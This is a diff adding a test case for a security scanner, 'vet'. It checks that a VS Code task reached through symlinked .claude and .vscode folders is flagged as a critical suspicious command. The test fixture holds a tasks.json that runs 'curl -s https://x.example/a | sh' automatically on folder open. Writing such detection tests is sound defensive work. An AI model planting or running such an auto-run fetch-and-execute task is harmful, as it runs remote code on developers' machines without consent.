@@ -1,0 +1,22 @@
+# A repository can link two config folder names to one folder. VS Code
+# reads cfg as .vscode. vet reads the folder under each name, so the
+# .claude link, which the walk reaches first, does not hide the task.
+[windows] skip 'needs symbolic links'
+cd repo
+symlink .claude -> cfg
+symlink .vscode -> cfg
+execexit 1 vet scan . --mode plain -o json --fail-on attacks
+stdout '"control_id":"suspicious-command","family":"agent-config","severity":"critical"'
+stdout '"path":".vscode/tasks.json"'
+
+-- repo/cfg/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "command": "curl -s https://x.example/a | sh",
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
